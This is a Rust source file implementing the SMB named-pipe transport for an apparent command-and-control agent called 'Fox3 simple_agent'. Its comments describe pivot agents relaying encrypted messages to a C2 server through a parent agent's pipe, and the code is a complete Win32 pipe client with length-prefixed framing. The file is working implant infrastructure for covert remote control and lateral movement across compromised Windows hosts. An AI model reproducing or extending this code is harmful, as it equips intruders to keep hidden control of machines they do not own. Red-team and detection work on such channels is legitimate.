/// SMB named-pipe transport for Fox3 simple_agent.
///
/// Used by pivot/child agents connecting through a parent agent's named pipe.
/// The parent agent exposes a pipe (or the C2 server's pipe is accessible via
/// UNC path through the network) and relays JWE messages to/from the server.
///
/// # Protocol framing
/// Every message is framed with a 4-byte little-endian length prefix:
///   [4-byte LE length][message bytes]
///
/// # Pipe path format
/// Windows UNC path: `\\server\pipe\name`
/// Local:            `\\.\pipe\name`

use crate::transport::Transporter;

pub struct SmbTransport {
    pipe_path: String,
}

impl SmbTransport {
    pub fn new(pipe_path: String) -> anyhow::Result<Self> {
        Ok(Self { pipe_path })
    }
}

impl Transporter for SmbTransport {
    fn send(&self, _auth: &str, body: Vec<u8>) -> anyhow::Result<Vec<u8>> {
        #[cfg(windows)]
        { imp::send_pipe(&self.pipe_path, body) }
        #[cfg(not(windows))]
        { let _ = body; anyhow::bail!("smb: Windows only") }
    }

    fn kind(&self) -> &'static str { "smb" }
}

#[cfg(windows)]
mod imp {
    use std::ffi::c_void;
    use std::ptr;

    const GENERIC_READ_WRITE:   u32 = 0xC000_0000;
    const OPEN_EXISTING:        u32 = 3;
    const FILE_FLAG_WRITE_THROUGH: u32 = 0x8000_0000;
    const INVALID_HANDLE_VALUE: *mut c_void = usize::MAX as *mut c_void;
    const NMPWAIT_WAIT_FOREVER: u32 = 0xFFFF_FFFF;
    const ERROR_PIPE_BUSY:      u32 = 231;

    extern "system" {
        fn CreateFileW(name: *const u16, access: u32, share: u32, sa: *mut c_void,
                       disposition: u32, flags: u32, tmpl: *mut c_void) -> *mut c_void;
        fn WriteFile(h: *mut c_void, buf: *const u8, n: u32, written: *mut u32,
                     overlapped: *mut c_void) -> i32;
        fn ReadFile(h: *mut c_void, buf: *mut u8, n: u32, read: *mut u32,
                    overlapped: *mut c_void) -> i32;
        fn CloseHandle(h: *mut c_void) -> i32;
        fn WaitNamedPipeW(name: *const u16, timeout: u32) -> i32;
        fn GetLastError() -> u32;
    }

    fn to_wide(s: &str) -> Vec<u16> {
        let mut v: Vec<u16> = s.encode_utf16().collect();
        v.push(0);
        v
    }

    fn open_pipe(path: &str) -> anyhow::Result<*mut c_void> {
        let wide = to_wide(path);
        loop {
            let h = unsafe {
                CreateFileW(
                    wide.as_ptr(), GENERIC_READ_WRITE, 0, ptr::null_mut(),
                    OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, ptr::null_mut(),
                )
            };
            if h != INVALID_HANDLE_VALUE { return Ok(h); }
            let err = unsafe { GetLastError() };
            if err != ERROR_PIPE_BUSY {
                anyhow::bail!("smb: CreateFile('{}') failed ({})", path, err);
            }
            unsafe { WaitNamedPipeW(wide.as_ptr(), NMPWAIT_WAIT_FOREVER); }
        }
    }

    fn write_framed(h: *mut c_void, data: &[u8]) -> anyhow::Result<()> {
        let len_bytes = (data.len() as u32).to_le_bytes();
        let mut written = 0u32;
        unsafe {
            if WriteFile(h, len_bytes.as_ptr(), 4, &mut written, ptr::null_mut()) == 0 {
                anyhow::bail!("smb: WriteFile(len) failed ({})", GetLastError());
            }
            if WriteFile(h, data.as_ptr(), data.len() as u32, &mut written, ptr::null_mut()) == 0 {
                anyhow::bail!("smb: WriteFile(body) failed ({})", GetLastError());
            }
        }
        Ok(())
    }

    fn read_framed(h: *mut c_void) -> anyhow::Result<Vec<u8>> {
        let mut len_buf = [0u8; 4];
        let mut n = 0u32;
        unsafe {
            if ReadFile(h, len_buf.as_mut_ptr(), 4, &mut n, ptr::null_mut()) == 0 || n != 4 {
                anyhow::bail!("smb: ReadFile(len) failed ({})", GetLastError());
            }
        }
        let msg_len = u32::from_le_bytes(len_buf) as usize;
        let mut buf = vec![0u8; msg_len];
        let mut total = 0usize;
        while total < msg_len {
            let mut n = 0u32;
            unsafe {
                if ReadFile(h, buf[total..].as_mut_ptr(), (msg_len - total) as u32, &mut n, ptr::null_mut()) == 0 {
                    anyhow::bail!("smb: ReadFile(body) failed ({})", GetLastError());
                }
            }
            total += n as usize;
        }
        Ok(buf)
    }

    /// Open the pipe, send framed body, read framed response, close.
    pub fn send_pipe(path: &str, body: Vec<u8>) -> anyhow::Result<Vec<u8>> {
        let h = open_pipe(path)?;
        let result = (|| {
            write_framed(h, &body)?;
            read_framed(h)
        })();
        unsafe { CloseHandle(h); }
        result
    }
}
